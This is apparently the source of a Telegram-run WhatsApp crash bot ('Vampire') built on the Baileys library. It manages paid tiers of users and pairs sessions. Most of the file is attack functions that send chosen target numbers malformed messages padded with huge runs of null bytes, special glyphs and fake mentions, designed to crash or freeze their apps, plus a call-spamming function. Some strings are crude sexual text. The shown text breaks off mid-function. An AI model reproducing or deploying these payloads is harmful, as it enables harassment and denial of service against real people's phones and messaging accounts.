const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const JsConfuser = require('js-confuser');
const CrashVamp = fs.readFileSync('./Vampire.jpeg')
const crypto = require('crypto');
const global = require('./VampireConfig.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let superVip = JSON.parse(fs.readFileSync('./superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./security.json'));
const owner = global.owner;
const cooldowns = new Map();
const axios = require('axios');
const startTime = new Date(); // Waktu mulai online

// Fungsi untuk menghitung durasi online dalam format jam:menit:detik
function getOnlineDuration() {
  let onlineDuration = new Date() - startTime; // Durasi waktu online dalam milidetik

  // Convert durasi ke format jam:menit:detik
  let seconds = Math.floor((onlineDuration / 1000) % 60); // Detik
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); // Menit
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); // Jam

  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function updateMenuBot() {
  const message = `${getOnlineDuration()}`;

  updateBotMenu(message);
}

function updateBotMenu(message) {
}

setInterval(() => {
  updateMenuBot();
}, 1000);






let sock;
let whatsappStatus = false;
let number = '';

async function getSessions(bot, chatId, numberTarget) {
  try {
    await bot.sendMessage(chatId, `⏳ Mencoba menghubungkan sesi WhatsApp untuk nomor ${numberTarget}...`);

    // Clear any existing credentials so a fresh pairing can occur
    if (fs.existsSync('./VampirePrivate/creds.json')) {
      fs.unlinkSync('./VampirePrivate/creds.json');
    }

    // Set the module-level number so startWhatsapp() can use it
    number = numberTarget;

    // Restart the WhatsApp connection
    await startWhatsapp();
  } catch (error) {
    console.error('getSessions error:', error);
    await bot.sendMessage(chatId, `❌ Gagal memulai sesi WhatsApp untuk nomor ${numberTarget}: ${error.message}`);
  }
}

async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
        console.log(`Connection closed. Reason: ${reason}`);
        
        // Don't show error on first connection attempt
        // Only show error if we were previously connected
        if (whatsappStatus === true) {
            // We were connected, now disconnected
            whatsappStatus = false;
            await bot.sendMessage(chatId, `Nomor ini ${number} \nTelah terputus dari WhatsApp.`);
            if (reason && reason >= 500 && reason < 600) {
                await getSessions(bot, chatId, number);
            } else {
                if (fs.existsSync('./VampirePrivate/creds.json')) {
                    fs.unlinkSync('./VampirePrivate/creds.json');
                }
            }
        } else {
            // First time connecting, just log and continue
            console.log(`Connection closed during initial pairing, waiting for code...`);
        }
    } else if (connection === 'open') {
        whatsappStatus = true;
        bot.sendMessage(chatId, `Nomor ini ${number} \nBerhasil terhubung oleh Bot.`);
    }

    if (connection === 'connecting') {
        await new Promise(resolve => setTimeout(resolve, 1000));
        try {
            if (!fs.existsSync('./VampirePrivate/creds.json')) {
                const formattedNumber = number.replace(/\D/g, '');
                const pairingCode = await sock.requestPairingCode(formattedNumber);
                const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                bot.sendMessage(chatId, `┏━━━━━━ 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 ━━━━━━┓
┃〢 Nᴜᴍʙᴇʀ : ${number}
┃〢 Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━━┛`);
            }
        } catch (error) {
            bot.sendMessage(chatId, `Nomor mu tidak Valid : ${error.message}`);
        }
    }
});

  sock.ev.on('creds.update', saveCreds);
}
function savePremiumUsers() {
  fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveVip() {
  fs.writeFileSync('./superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
  fs.writeFileSync('./banned.json', JSON.stringify(bannedUser, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
      if (eventType === 'change') {
          try {
              const updatedData = JSON.parse(fs.readFileSync(filePath));
              updateCallback(updatedData);
              console.log(`File ${filePath} updated successfully.`);
          } catch (error) {
              console.error(`Error updating ${filePath}:`, error.message);
          }
      }
  });
}
watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));
watchFile('./banned.json', (data) => (bannedUser = data));
watchFile('./superVip.json', (data) => (superVip = data));
watchFile('./security.json', (data) => (securityUser = data));
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function spamcall(target) {
    // Inisialisasi koneksi dengan makeWASocket
    const sock = makeWASocket({
        printQRInTerminal: false, // QR code tidak perlu ditampilkan
    });

    try {
        console.log(`📞 Mengirim panggilan ke ${target}`);

        // Kirim permintaan panggilan
        await sock.query({
            tag: 'call',
            json: ['action', 'call', 'call', { id: `${target}` }],
        });

        console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
    } catch (err) {
        console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
    } finally {
        sock.ev.removeAllListeners(); // Hapus semua event listener
        sock.ws.close(); // Tutup koneksi WebSocket
    }
}
async function VampireBlank(target, ptcp = true) {
  const jids = `_*~@8~*_\n`.repeat(10500);
  const ui = 'ꦽ'.repeat(55555);

  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐁𝐥𝐚𝐧𝐤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'Aku nak Coli' + ui + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐁𝐥𝐚𝐧𝐤",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function VampireCrashTotal(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "AmbatakumCrt." + "\u0000".repeat(77777) + "@8".repeat(77777),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function VampireCrashWa(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Skibidi Bintang10." + "ꦽ".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Vampire File",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༑ Crash Total - ( Draculaxtzy ) "👋"',
                footerText: "Di Dukung Oleh ©WhatsApp.",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(550000),
                    buttonText: {
                      displayText: "Oyyy Lu Gak teraweh yaaa??",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: CrashVamp,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Whhwhahwha",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'Dracula?',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: CrashVamp,
              sourceUrl: "Terawehsono",
              sourceId: "Dracula - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Whahhhaa 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "P Ada dracula™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
async function VampireSpamNotif(target, Ptcp = true) {
    let virtex = "Assalamualaikum" + "ꦾ".repeat(90000) + "@8".repeat(90000);
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function VampireDevice(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Jwab cuki" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Dracula",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function VampireNewUi(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "Banggg Aku hamill‎‏‎‏‎‏⭑̤\n" +
                  "\u0018".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Dracula",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function VampireSuperUi(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Udah adzan bg." + "\u0000".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Vampire File",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༑ Crash Total - ( Senzo_Official ) "👋"',
                footerText: "Di Dukung Oleh ©WhatsApp.",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(55000),
                    buttonText: {
                      displayText: "Senzo Crasher",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: CrashVamp,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Senzo268",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: CrashVamp,
              sourceUrl: "Tetaplah Menjadi Bodoh...",
              sourceId: "Dracula - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Bakaa 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "By : Whhwhahwha™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
    async function VampireiPhone(target) {
      try {
        await sock.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "Draculaxtzy IOՏ̊‏‎‏‎‏‎‏⭑",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "ᐯᗩᗰᑭIᖇᗴ IOՏ̊‏‎",
                  body: "ᐯᗩᗰᑭIᖇᗴ IOՏ‏‎",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
